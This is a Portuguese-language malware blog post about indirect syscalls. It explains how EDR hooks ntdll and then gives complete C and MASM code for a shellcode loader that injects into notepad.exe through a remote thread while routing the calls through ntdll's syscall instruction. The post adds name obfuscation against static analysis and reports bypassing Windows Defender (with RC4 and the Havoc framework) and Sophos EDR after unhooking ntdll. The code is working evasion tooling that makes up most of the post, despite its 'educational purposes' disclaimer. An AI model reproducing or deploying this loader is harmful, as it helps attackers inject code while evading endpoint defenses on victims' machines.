---
weight: 3
title: "Post III: Indirect Syscalls"
date: 2024-10-05T15:58:26+08:00
lastmod: 2024-10-05T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

Percebi que já havia abordado o tema de **syscalls indiretos** em outros posts, mas nunca tinha feito um post específico sobre o assunto. Então, neste post, vamos criar um loader que utiliza **syscalls indiretos**.
## Entendendo o processo
Vou deixar abaixo algumas imagens que encontrei e que acredito serem úteis para entender melhor o assunto.

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.

A figura abaixo mostra como funcionam as chamadas de sistema usando o exemplo do Bloco de Notas (notepad.exe). Quando o Bloco de Notas salva um arquivo, ele segue os seguintes passos:

1. Primeiro, ele acessa o arquivo `kernel32.dll` e chama a função do Windows chamada `WriteFile`.
2. Em seguida, o `kernel32.dll` chama outro arquivo chamado `Kernelbase.dll` para continuar o processo.
3. Depois, a função `WriteFile` usa a função nativa do Windows chamada `NtCreateFile`, encontrada no `Ntdll.dll`. Essa função nativa tem as instruções para iniciar a "chamada de sistema", que é um comando que faz o computador trocar do modo usuário (onde os programas normais rodam) para o modo kernel (onde as partes mais importantes do sistema operam), e assim salva o arquivo.

Esses passos fazem com que o computador realize a transição de modos e consiga salvar o arquivo no disco.

![](https://redops.at/assets/images/blog/notepad_transition_syscall.png)

A figura abaixo explica como funciona um **AV/EDR** ao monitorar e interceptar chamadas de sistema.

1. Quando o Bloco de Notas quer criar um arquivo, ele chama a função `CreateFileW` usando a `Kernel32.dll`.
2. Essa função passa para a `Kernelbase.dll`, que continua o processo normalmente.
3. Antes da chamada de sistema ser realizada, o **EDR** interfere. Ele usa o arquivo `Hooking.dll` para modificar a função nativa `NtCreateFile`, que está dentro do `Ntdll.dll`. Isso é conhecido como **"API Hooking"**.
4. Depois que o **EDR** processa ou verifica a função, a chamada de sistema é finalmente executada.
5. A função `NtCreateFile` continua, e o sistema realiza a transição para o modo kernel (Ring 0), onde a função é executada no nível mais baixo do sistema.

Com isso, o **EDR** consegue monitorar e até bloquear ações suspeitas antes que o sistema as execute.


![](https://redops.at/assets/images/blog/Usermode_hooking_principle.png)
![](https://i.imgur.com/9UtU4S1.png)<br>

A figura abaixo mostra a transição do modo de usuário para o modo kernel no contexto da execução de malware com chamadas de sistema diretas implementadas.

1. O malware `Malware.exe` deseja realizar uma operação, como criar um arquivo, mas em vez de usar as APIs comuns do Windows, como `CreateFileW()`, ele opta por um método mais furtivo.
2. Em vez de invocar a função `NtCreateFile()` através da `Ntdll.dll` (que é comumente usada para essas operações), o malware faz uso de **"direct syscalls"** (chamadas de sistema diretas). Ou seja, ele salta completamente as camadas intermediárias e invoca diretamente as instruções de syscall do sistema operacional, ignorando funções como `NtCreateFile()`. 
3. Esse método de **"direct syscalls"** permite ao malware evitar interceptações ou modificações feitas por sistemas de monitoramento, como **EDRs**, que frequentemente **"hookam"** ou monitoram APIs de nível superior como `Ntdll.dll`.
4. Ao fazer a chamada de sistema direta, a execução imediatamente transita para o modo kernel (Ring 0), onde a função de sistema `KiSystemCall64` é chamada.
5. O `KiSystemCall64` pesquisa a tabela de descritores de serviço do sistema (SSDT) para encontrar o código da função correspondente, como `NtCreateFile()` ou a função de sistema diretamente referenciada.
6. Finalmente, o sistema executa a operação no modo kernel com privilégios elevados, permitindo ao malware realizar sua ação sem ser detectado pelas ferramentas de segurança que monitoram as camadas superiores.

O uso de **"direct syscalls"** permite que o malware contorne facilmente as camadas de defesa baseadas em APIs monitoradas, evitando a maioria das técnicas de detecção que dependem do hook nas funções intermediárias.

![](https://redops.at/assets/images/blog/direct_syscall_principle.png)

## Indirect syscalls

A figura abaixo ilustra como um **malware** utiliza a técnica de **syscall indireta (indirect syscall)** para realizar chamadas de sistema de maneira mais furtiva em comparação com a técnica de **syscall direta (direct syscall)**.

1. O malware `Malware.exe` prepara os registradores necessários para realizar a operação de forma semelhante à syscall direta. No entanto, em vez de fazer a chamada diretamente para o kernel, ele faz o salto para a instrução de syscall que já está dentro da `Ntdll.dll`.
   - **Por que é menos suspeito?**: Como a instrução syscall é executada na memória legítima da `Ntdll.dll`, ela parece uma operação legítima para o **AV/EDR**, já que a `Ntdll.dll` é uma parte confiável do sistema. Essa abordagem reduz as chances de detecção.
   
2. Uma grande vantagem dessa técnica é que tanto a execução da syscall quanto a instrução de retorno (`syscall return`) ocorrem na memória da `Ntdll.dll`. Isso dá uma aparência de comportamento legítimo.
   - **Evasão de AV/EDR**: O EDR pode estar monitorando chamadas diretas de syscalls customizadas que executam operações maliciosas. No entanto, como a execução ocorre dentro de uma biblioteca de sistema legítima, como a `Ntdll.dll`, a execução é vista como "normal", dificultando a detecção.
   
3. Quando a syscall é invocada a partir da `Ntdll.dll`, a transição para o modo kernel (Ring 0) ocorre normalmente, com a função `KiSystemCall64` sendo executada, e a tabela SSDT (System Service Descriptor Table) consultada.
   
4. Após a execução do comando syscall, a instrução de retorno (`syscall return`) redireciona o controle para a memória legítima da `Ntdll.dll`, e, a partir daí, o fluxo de execução retorna ao malware.
   - **Diferença com Direct Syscalls**: Na técnica de direct syscall, o malware executa diretamente a instrução syscall, o que pode levantar suspeitas, pois a execução ocorre em uma região de memória fora de uma biblioteca legítima. Isso pode ser detectado mais facilmente por ferramentas de segurança.
   
5. A técnica de **syscall indireta** é, portanto, uma evolução da **syscall direta**, pois resolve problemas de evasão de **AV/EDR**, tornando a atividade maliciosa menos detectável. Ao executar tanto a syscall quanto o retorno dentro da `Ntdll.dll`, o malware se mistura melhor com as operações legítimas do sistema, enganando as defesas baseadas em comportamento.

Essa técnica torna o malware significativamente mais furtivo, pois explora o fato de que os **AV/EDRs** confiam no código da `Ntdll.dll` e não "esperam" que a execução maliciosa esteja ocorrendo a partir desse local confiável.

![](https://i.imgur.com/avFZoDF.png)

## Código

Aqui está a nossa `func.h`, que define algumas funções essenciais para a execução de **syscalls indiretas**. Nela, incluímos a estrutura `CLIENT_ID`, que ajuda a identificar processos e threads, e `OBJECT_ATTRIBUTES`, que armazena atributos de objetos do Windows. Também declaramos funções como `NtOpenProcess`, `NtAllocateVirtualMemory`, e outras, que serão usadas para interagir com processos e memória de forma direta.

```c
#include <windows.h>  
#include <stdio.h> 
#include <psapi.h>
#include <tlhelp32.h>
#include <wchar.h>

void SetConsoleColor(WORD color) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, color);
}

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

extern NtOpenProcess(
	PHANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID ClientId
);

extern NTSTATUS NtAllocateVirtualMemory(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
);


extern NTSTATUS NtWriteVirtualMemory(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	SIZE_T NumberOfBytesToWrite,
	PULONG NumberOfBytesWritten
);


extern NTSTATUS NtCreateThreadEx(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	PVOID ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID lpStartAddress,
	PVOID lpParameter,
	ULONG Flags,
	SIZE_T StackZeroBits,
	SIZE_T SizeOfStackCommit,
	SIZE_T SizeOfStackReserve,
	PVOID lpBytesBuffer
);


extern NTSTATUS NtWaitForSingleObject(
	HANDLE Handle,
	BOOLEAN Alertable,
	PLARGE_INTEGER Timeout

);

void InitializeObjectAttributes(
	POBJECT_ATTRIBUTES pObjectAttributes,
	PUNICODE_STRING pObjectName,
	ULONG Attributes,
	HANDLE RootDirectory,
	PVOID SecurityDescriptor
) {
	if (pObjectAttributes == NULL) {
		return;
	}

	pObjectAttributes->Length = sizeof(OBJECT_ATTRIBUTES);
	pObjectAttributes->RootDirectory = RootDirectory;
	pObjectAttributes->ObjectName = pObjectName;
	pObjectAttributes->Attributes = Attributes;
	pObjectAttributes->SecurityDescriptor = SecurityDescriptor;
	pObjectAttributes->SecurityQualityOfService = NULL;
}

DWORD SSNtOpenProcess;
UINT_PTR AddrNtOpenProcess;
DWORD SSNtAllocateVirtualMemory;
UINT_PTR AddrNtAllocateVirtualMemory;
DWORD SSNtWriteVirtualMemory;
UINT_PTR AddrNtWriteVirtualMemory;
DWORD SSNtCreateThreadEx;
UINT_PTR AddrNtCreateThreadEx;
DWORD SSNtWaitForSingleObject;
UINT_PTR AddrNtWaitForSingleObject;
```

## Agora em nosso código `main`

Começamos incluindo nosso cabeçalho `func.h`, que reúne as declarações necessárias para as funções NT que utilizamos.

Utilizamos o `GetProcessIdByName` para buscar o PID (Process ID) de um processo alvo pelo seu nome.

Além disso, resolvemos ponteiros de função para chamadas de API nativas do Windows, extraídas de `ntdll.dll`, obtendo os números de syscalls e os endereços dessas syscalls para funções como `NtOpenProcess`, `NtAllocateVirtualMemory`, e outras. Nosso objetivo final é abrir o processo de destino, alocar memória, escrever o shellcode nessa memória alocada e executar o shellcode, usando syscalls.

---
### Ofuscação de Nomes de Funções

Como mencionamos anteriormente, a técnica de **ofuscação** utilizada para os nomes das funções NT é interessante:
```c
char NotNtOpenProcessName[] = { 'N', 't', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
```
 Ao definir os nomes como arrays de caracteres em vez de strings, estamos criando uma barreira contra análise de código **estático**. Isso pode ser uma abordagem importante em alguns cenários, pois torna mais "difícil" para ferramentas de detecção identificarem facilmente as operações que o código realiza.

---
### Obtenção de Endereços de Funções

Fazemos o uso de `GetProcAddress` em conjunto com `GetModuleHandleA` para recuperar os endereços das funções **NT**. Também temos um deslocamento de **4 bytes** adicionado ao endereço da função recuperada, seguido pela soma de **0x12** ao endereço recuperado.<br> **Exemplo:**

`NtOpenProcess = 0x00007FF98C5ADA10 <-- Endereço`
`NtOpenProcess Syscall = 0x00007FF98C5ADA22 <-- Endereço`
`0x00007FF98C5ADA22` **-** `0x00007FF98C5ADA10` **=** `0x12`
`0x00007FF98C5ADA10` **+** `0x12` **=** `0x00007FF98C5ADA22`

---
### Manipulação de Memória
Temos nossas chamadas `NtAllocateVirtualMemory` e `NtWriteVirtualMemory` para alocar espaço de memória no processo alvo e escrever o shellcode. A alocação de memória em um processo remoto exige permissões adequadas. O uso de **MEM_COMMIT | MEM_RESERVE** em `NtAllocateVirtualMemory` é importante, pois garante que a memória alocada esteja disponível e pronta para uso.

---
### Criação de Threads
Realizamos a criação de uma **thread remota** com `NtCreateThreadEx`. A função inicia a execução do Shellcode escrito na memória, fazemos uso de `NtWaitForSingleObject` para esperar a conclusão da thread que inciamos.

---
### Gerenciamento de Cores do Console
Coloquei o `SetConsoleColor` que ajuda a manipular a cor do console, adicionando na minha opinião uma camada de interatividade ao programa. Essa abordagem de interface com o usuário é frequentemente negligenciada em exemplos de código, mas para mim é crucial para a experiência do usuário. Permitindo que os erros e informações sejam destacados visualmente.

```c
#include"func.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

unsigned char shellcode[] = { ...Shellcode... };

SIZE_T shellcodeSize = sizeof(shellcode);

DWORD GetProcessIdByName(const wchar_t* processName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(snapshot, &processEntry))
		{
			do
			{
				if (wcscmp(processEntry.szExeFile, processName) == 0)
				{
					CloseHandle(snapshot);
					return processEntry.th32ProcessID;
				}
			} while (Process32NextW(snapshot, &processEntry));
		}
	}

	CloseHandle(snapshot);
	return 0;
}

void printAddressLetterByLetter(const char* name, UINT_PTR ntapiAddress, UINT_PTR syscallAddress) {
    SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    
    printf("Endereco de %s: ", name);
    char ntapiBuffer[20];
    sprintf_s(ntapiBuffer, sizeof(ntapiBuffer), "0x%p", (void*)ntapiAddress);

    for (int i = 0; ntapiBuffer[i] != '\0'; i++) {
        printf("%c", ntapiBuffer[i]);
        fflush(stdout);
        Sleep(10);
    }
    printf("\n");
    
    printf("Endereco de %s Syscall: ", name);
    char syscallBuffer[20];
    sprintf_s(syscallBuffer, sizeof(syscallBuffer), "0x%p", (void*)syscallAddress);

    for (int i = 0; syscallBuffer[i] != '\0'; i++) {
        printf("%c", syscallBuffer[i]);
        fflush(stdout);
        Sleep(10);
    }
    printf("\n");
}

int main() {

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	PVOID allocBuffer = NULL;

	char n_dll_name[] = { 'n','t','d','l','l','.','d','l','l',0 };
	char NotNtOpenProcessName[] = { 'N', 't', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
	char NotNtAllocateVirtualMemoryName[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
	char NotNtWriteVirtualMemoryName[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
	char NotNtCreateThreadExName[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', 0 };
	char NotNtWaitForSingleObjectName[] = { 'N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };

	SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
	printf(
		" _______           __ __                   __        _______                          __ __	\n"
		"|_     _|.-----.--|  |__|.----.-----.----.|  |_     |     __|.--.--.-----.----.---.-.|  |  |.-----.	\n"
		" _|   |_ |     |  _  |  ||   _|  -__|  __||   _|    |__     ||  |  |__ --|  __|  _  ||  |  ||__ --| \n"
		"|_______||__|__|_____|__||__| |_____|____||____|    |_______||___  |_____|____|___._||__|__||_____| \n"
		"                                                             |_____|							\n"  
	);

	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	printf("////////// CARREGANDO FUNCOES NT //////////\n\n");

	UINT_PTR pNtOpenProcess = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtOpenProcessName);
	if (pNtOpenProcess == 0) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nErro: Nao foi possivel encontrar o endereco de NtOpenProcess\n");
		return 1;
	}
	SSNtOpenProcess = ((unsigned char*)(pNtOpenProcess + 4))[0];
	AddrNtOpenProcess = pNtOpenProcess + 0x12;
	printAddressLetterByLetter("NtOpenProcess", pNtOpenProcess, pNtOpenProcess + 0x12);

	UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtAllocateVirtualMemoryName);
	if (pNtAllocateVirtualMemory == 0) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nErro: Nao foi possivel encontrar o endereco de NtAllocateVirtualMemory\n");
		return 1;
	}
	SSNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
	AddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
	printAddressLetterByLetter("NtAllocateVirtualMemory", pNtAllocateVirtualMemory, pNtAllocateVirtualMemory + 0x12);

	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtWriteVirtualMemoryName);
	if (pNtWriteVirtualMemory == 0) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nErro: Nao foi possivel encontrar o endereco de NtWriteVirtualMemory\n");
		return 1;
	}
	SSNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
	AddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
	printAddressLetterByLetter("NtWriteVirtualMemory", pNtWriteVirtualMemory, pNtWriteVirtualMemory + 0x12);

	UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtCreateThreadExName);
	if (pNtCreateThreadEx == 0) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nErro: Nao foi possivel encontrar o endereco de NtCreateThreadEx\n");
		return 1;
	}
	SSNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
	AddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
	printAddressLetterByLetter("NtCreateThreadEx", pNtCreateThreadEx, pNtCreateThreadEx + 0x12);

	UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtWaitForSingleObjectName);
	if (pNtWaitForSingleObject == 0) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nErro: Nao foi possivel encontrar o endereco de NtWaitForSingleObject\n");
		return 1;
	}
	SSNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];
	AddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
	printAddressLetterByLetter("NtWaitForSingleObject", pNtWaitForSingleObject, pNtWaitForSingleObject + 0x12);

	const wchar_t* processName = L"notepad.exe";
	DWORD pid = GetProcessIdByName(processName);

	HANDLE hProcess;
	CLIENT_ID clientId = { 0 };
	clientId.UniqueProcess = (HANDLE)pid;
	clientId.UniqueThread = NULL;

	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	printf("\n[*] Pressione Enter para abrir processo alvo");
	(void)getchar();
	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("[!] Abrindo Processo Alvo Com NtOpenProcess");

	NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
	if (!NT_SUCCESS(status)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nFalha ao abrir o processo de destino NTSTATUS: 0x%08X\n", status);
		return 1;
	}
	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	printf("\n[*] Pressione Enter para alocar memoria no processo alvo");
	(void)getchar();
	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("[!] Alocando Memoria Com NtAllocateVirtualMemory");

	NTSTATUS statusA = NtAllocateVirtualMemory(hProcess, &allocBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(statusA)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nErro: Falha ao alocar memoria virtual. NTSTATUS: 0x%08X\n", statusA);
		return 1;
	}

	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	printf("\n[*] Pressione Enter para escrever na memoria no processo alvo");
	(void)getchar();
	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("[!] Escrevendo Shellcode Com NtWriteVirtualMemory");

	SIZE_T bytesWritten;
	NTSTATUS  statusW = NtWriteVirtualMemory(hProcess, allocBuffer, shellcode, shellcodeSize, &bytesWritten);
	if (!NT_SUCCESS(statusW)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nErro: Falha ao escrever na memoria virtual. NTSTATUS: 0x%08X\n", statusW);
		return 1;
	}

	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	printf("\n[*] Pressione Enter para criar thread remota");
	(void)getchar();
	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("[!] Criando Thread Remota Com NtCreateThreadEx");

	HANDLE hThread;
	NTSTATUS statusT = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(statusT)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf("\nFalha ao criar thread remoto. NTSTATUS: 0x%08X\n", status);
		CloseHandle(hThread);
		return 1;
	}
	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("\n[!] Aguardando Thread Completar Com NtWaitForSingleObject");
	SetConsoleTextAttribute(hConsole, 7);
	NtWaitForSingleObject(hThread, FALSE, NULL);
	return 0;
}
```
## Agora nosso código `asm`

`Extern` Indica que o símbolo é definido em outro módulo.
`SSNtOpenProcess:DWORD` É o Número de syscall para `NtOpenProcess`.
Obtemos o número SSN de uma possível função **NTAPI** lendo o valor no deslocamento `0x4` no stub de montagem da referida função:
```c
SSNtOpenProcess = ((unsigned char*)(pNtOpenProcess + 4))[0];
```
`AddrNtOpenProcess` É o endereço real da instrução **syscall** de `NtOpenProcess` em `ntdll.dll`.
Obtemos o endereço da instrução **syscall** adicionando `0x12` ao endereço de `pNtOpenProcess`
```c
AddrNtOpenProcess = pNtOpenProcess + 0x12;
```
`jmp QWORD PTR [AddrNtOpenProcess]` É um salto incondicional, ela vai pular para o endereço `AddrNtOpenProcess` que vai ser o endereço da instrução **syscall** de `NtOpenProcess` em `ntdll.dll`.

```c
EXTERN SSNtOpenProcess:DWORD               
EXTERN AddrNtOpenProcess:QWORD  

EXTERN SSNtAllocateVirtualMemory:DWORD               
EXTERN AddrNtAllocateVirtualMemory:QWORD       

EXTERN SSNtWriteVirtualMemory:DWORD                  
EXTERN AddrNtWriteVirtualMemory:QWORD            

EXTERN SSNtCreateThreadEx:DWORD                      
EXTERN AddrNtCreateThreadEx:QWORD                

EXTERN SSNtWaitForSingleObject:DWORD                
EXTERN AddrNtWaitForSingleObject:QWORD          

.CODE

NtOpenProcess PROC
    mov r10, rcx
    mov eax, SSNtOpenProcess
    jmp QWORD PTR [AddrNtOpenProcess]
NtOpenProcess ENDP


NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, SSNtAllocateVirtualMemory
    jmp QWORD PTR [AddrNtAllocateVirtualMemory]
NtAllocateVirtualMemory ENDP


NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, SSNtWriteVirtualMemory
    jmp QWORD PTR [AddrNtWriteVirtualMemory]
NtWriteVirtualMemory ENDP


NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, SSNtCreateThreadEx
    jmp QWORD PTR [AddrNtCreateThreadEx]
NtCreateThreadEx ENDP


NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, SSNtWaitForSingleObject
    jmp QWORD PTR [AddrNtWaitForSingleObject]
NtWaitForSingleObject ENDP

END  
```
## Prova de conceito:
Note que o primeiro executável que testamos é um loader que utiliza APIs **NT** mas não faz uso de **syscalls indiretas**. Já o segundo executável é o loader que, de fato, faz uso de **syscalls indiretas**.

<iframe width="760" height="515" src="https://www.youtube.com/embed/7MwtfqRqqCA" frameborder="0" allowfullscreen></iframe>

## Detecção
Obtive 5 detecções no [VirusTotal](https://www.virustotal.com/). Não está muito bom, mas dá para melhorar:

![](https://i.imgur.com/DrCcvnf.png)


## Contra Windows Defender
O **Windows Defender** não foi grande coisa, conseguimos contorná-lo facilmente. Apenas apliquei
descriptografia **RC4**, que já foi abordada em um post anterior, e fiz uso do [Havoc](https://havocframework.com/).
Lembrando que este código ainda tem muito espaço para melhorar.

<iframe width="760" height="515" src="https://www.youtube.com/embed/btTFZzf0yPs" frameborder="0" allowfullscreen></iframe>

## Contra Sophos EDR
Bom, eu fiz esse post há cerca de uma semana, e como estou livre, sem nada para fazer, decidi realizar mais um teste com o código de *indirect syscalls*. Decidi ver como ele se sairia contra o [SOPHOS](https://www.sophos.com/pt-br/products/endpoint-antivirus/edr). De início, percebi que, sem realizar o *unhooking* da `ntdll`, não seria possível nem passar da parte de alocação de memória. Então, decidi utilizar um código simples para realizar o *unhooking* da `ntdll.dll` e verificar se conseguiria prosseguir com sua execução normalmente. E este foi o resultado:

<iframe width="760" height="515" src="https://www.youtube.com/embed/N3p4A1jh_4I" frameborder="0" allowfullscreen></iframe>